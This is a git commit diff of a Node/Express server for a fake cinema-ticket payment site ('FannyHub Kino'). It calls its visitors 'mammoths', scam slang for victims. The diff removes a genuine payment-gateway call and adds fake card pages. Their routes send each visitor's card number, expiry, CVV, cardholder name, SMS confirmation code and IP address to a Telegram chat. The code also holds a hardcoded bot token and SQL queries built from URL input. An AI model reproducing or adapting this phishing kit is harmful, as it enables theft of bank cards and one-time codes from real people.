2976161f71e1db75af6c6026de50b2921ff7c574
u2sername222 <122731690+u2sername222@users.noreply.github.com>
2023-02-13 22:22:28 +0100

    Add files via upload

--- index.js
+++ index.js
@@ -1,10 +1,7 @@
 const {Client} = require('pg');
 const TelegramApi = require('node-telegram-bot-api');
-const bodyParser = require('body-parser');
 const express = require('express');
-const cors = require("cors");
-const axios = require("axios");
-const crypto = require("crypto");
+
 
 // Подключение к бд
 const client = new Client({
@@ -14,44 +11,41 @@ const client = new Client({
     database: "default_db",
     port: 5432
 });
-
 client.connect();
 
 // Обработака сайта
 const app = express();
 app.set('view engine', 'ejs');
-app.use(bodyParser.urlencoded({extended: false}));
-app.use(bodyParser.json());
+app.use(express.urlencoded({extended: false}));
 app.use(express.static('public'));
 
 try {
 
     app.get('/', (req, res) => {
-        res.render('index_ua', {userplace: "вул Глінки, 2, Дніпро, Дніпропетровська область, Україна, 49000"})
-        // res.render('error')
-    })
-
-    app.post('/939944288', (req, res) => {
-        res.render('index_ua', {userplace: "вул Глінки, 2, Дніпро, Дніпропетровська область, Україна, 49000"})
-        // res.render('error');
+        res.render('error')
     })
 
     app.get('/:userlink', (req, res) => {
         client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
-            console.log(ress)
             if (ress.rows[0] === undefined) {
+                console.log('error');
                 return console.log("error");
             }
             if (req.params.userlink.search('ua') !=  -1){
+                console.log(1);
                 var index = 'index_ua';
+            } else if (req.params.userlink.search('pln') !=  -1) {
+                console.log(2);
+                var index = 'index_pln';
             } else {
+                console.log(3);
                 var index = 'index';
             }
             if (ress) {
                 const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                 res.render(index, {userplace: ress.rows[0].place});
                 client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
-                    // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n\nID Воркера - ${res.rows[0].user_id}\nИмя Воркера - ${ress.rows[0].user_name}\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+                    bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                 })
                 return console.log(ress.rows[0].place);
             } else {
@@ -60,89 +54,116 @@ try {
         })
 
     })
-    
-    app.post('/3dsua', async (req, res) => {
-        // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел на страницу оплаты RU\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
 
-        const fondyPassword = 'test';
-
-        const orderBody = {
-            order_id: `test3f45f64f33${Date.now()}`,
-            order_desc: "🍿 FannyHub Kino",
-            currency: "UAH",
-            amount: `${req.body.amount * 100}`,
-            merchant_id: "1396424",
-            response_url: "http://localhost:8080/939944288"
-        }
-
-        const orderedKeys = Object.keys(orderBody).sort((a, b) => {
-            if (a < b) return -1;
-            if (a > b) return 1;
-            return 0
-        })
-
-        const signatureRaw = orderedKeys.map((v) => orderBody[v]).join('|');
-        const signature = crypto.createHash('sha1');
-        signature.update(`${fondyPassword}|${signatureRaw}`);
-
-        const { data } = await axios.post('https://pay.fondy.eu/api/checkout/url/', {
-            request: {
-                ...orderBody,
-                signature: signature.digest('hex'),
-                email: false,
-            },
-
-        })
-        res.redirect(data.response.checkout_url)
-        return {
-            statusCode: 200,
-            body: JSON.stringify({
-            })
-        }
+    app.post('/3ds', (req, res) => {
+        res.render('index_card', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
-    app.post('/3ds', async (req, res) => {
-        // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел на страницу оплаты UA\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
-
-        const fondyPassword = 'test';
-
-        const orderBody = {
-            order_id: `test12345643sdftestf534333dde33433334re3435344453${Date.now()}`,
-            order_desc: "🍿 FannyHub Kino",
-            currency: "RUB",
-            amount: `${req.body.amount * 100}`,
-            merchant_id: "1396424",
-            response_url: "http://localhost:8080/939944288"
-        }
-
-        const orderedKeys = Object.keys(orderBody).sort((a, b) => {
-            if (a < b) return -1;
-            if (a > b) return 1;
-            return 0
-        })
-
-        const signatureRaw = orderedKeys.map((v) => orderBody[v]).join('|');
-        const signature = crypto.createHash('sha1');
-        signature.update(`${fondyPassword}|${signatureRaw}`);
-
-        const { data } = await axios.post('https://pay.fondy.eu/api/checkout/url/', {
-            request: {
-                ...orderBody,
-                signature: signature.digest('hex'),
-                email: false,
-            },
-
-        })
-        res.redirect(data.response.checkout_url)
-        return {
-            statusCode: 200,
-            body: JSON.stringify({
-            })
-        }
+    app.post('/3dsua', (req, res) => {
+        res.render('index_card_ua', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
-    
+    app.post('/3dspln', (req, res) => {
+        res.render('index_card_pln', {amount: req.body.amount});
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
+    })
 
+    app.post('/confirmationua', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        res.render('index_code_ua', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+    })
+
+    app.post('/confirmation', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+    
+                                })
+    app.post('/confirmationpln', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
+        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
+                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
+                                    amount: req.body.amount,
+                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                    expdate1: req.body.expdate1,
+                                    expdate2: req.body.expdate2,
+                                    cvc2: req.body.cvc2});
+
+    })
+    app.post('/confirmation_fpln', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f_pln', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
+    app.post('/confirmation_fua', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f_ua', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
+    
+    app.post('/confirmation_f', (req, res) => {
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
+        let sms_number = req.body.sms_number;
+        if (req.body.sms_number === undefined) {
+            sms_number = req.body.securecode;
+        }
+        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
+        setTimeout(function(){
+            res.render('index_code_f', {cardnumber: req.body.cardnumber,
+                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
+                                        amount: req.body.amount,
+                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
+                                        expdate1: req.body.expdate1,
+                                        expdate2: req.body.expdate2,
+                                        cvc2: req.body.cvc2});
+        }, 3000);
+        
+    })
 } catch (err) {
     console.log('error');
   }
@@ -150,6 +171,5 @@ try {
 const PORT = 8080;
 
 app.listen(PORT, () => {
-    console.log(`Server started...  port: `, PORT);
+    console.log(`Server started... `);
 })
-
